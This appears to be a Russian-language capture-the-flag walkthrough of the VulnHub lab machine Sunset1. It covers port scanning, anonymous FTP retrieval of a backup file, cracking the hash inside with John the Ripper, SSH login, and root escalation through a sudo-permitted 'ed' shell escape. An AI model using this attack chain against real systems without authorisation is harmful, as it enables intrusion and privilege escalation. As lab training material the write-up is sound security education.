---
title: Sunset1
tags: [vulnhub, writeup, ftp, john, sudo, privesc]
author: mapanit
date: 2026-07-15
difficulty: Beginner
target_ip: 10.0.2.5
attacker_ip: 10.0.2.15
---

# VulnHub: Sunset Machine Walkthrough

> **Author:** mapanit
> **Date:** 15.07.2026
> **Target IP:** `10.0.2.5`
> **Attacker IP:** `10.0.2.15`
> **Difficulty:** Beginner

---

## Сканирование порта

```bash
nmap -A 10.0.2.5
```

- `-A` — агрессивное сканирование, включая скрипты по умолчанию

Виртуальная уязвимая машина Sunset1 базируется на IP `10.0.2.5`.

**Результат:** доступны два порта:

- `21` — FTP
- `22` — SSH

![](images/Sunset1-01.png)

На порту 21 разрешён анонимный вход по FTP, доступен файл `backup`.

## Вход в FTP

```bash
ftp 10.0.2.5
```

![](images/Sunset1-02.png)

После успешного входа проверяем наличие файла `backup` и забираем его:

```ftp
ls
get backup
exit
```

## Получение пароля из backup

![](images/Sunset1-03.png)

Читаем файл `backup` — внутри хешированные учётные данные. Копируем строку `sunset` полностью и сохраняем в свой файл (например, `hash`).

**![](images/Sunset1-04.png)**

![](images/Sunset1-05.png)

Применяем John the Ripper:

```bash
john hash
```


Показываем результат:

```bash
john hash --show
```

![](images/Sunset1-06.png)

Получен пароль: **`cheer14`**

## Забираем флаг user

Используем полученный пароль для входа по SSH:

```bash
ssh sunset@10.0.2.5
```

![](images/Sunset1-07.png)

Проверяем наличие файлов:

```bash
ls
cat user.txt
```

![](images/Sunset1-08.png)

Найден первый флаг — `user.txt`.

## Забираем флаг root

Переходим в корневой каталог:

```bash
cd /
cd root
```

![](images/Sunset1-09.png)

Доступа к папке `root` нет. Проверяем права sudo:

```bash
sudo -l
```

![](images/Sunset1-10.png)

У пользователя есть право запускать `ed` с правами `root` без пароля (подсказка найдена на [GTFOBins](https://gtfobins.github.io/) для `ed`).

![](images/Sunset1-11.png)

![](images/Sunset1-12.png)

Эксплуатация:

```bash
sudo ed
```

![](images/Sunset1-13.png)

Внутри `ed`:

```
!/bin/sh
```

![](images/Sunset1-14.png)

Получена оболочка с правами **root** — теперь доступна и корневая папка.

---

*Готово.*
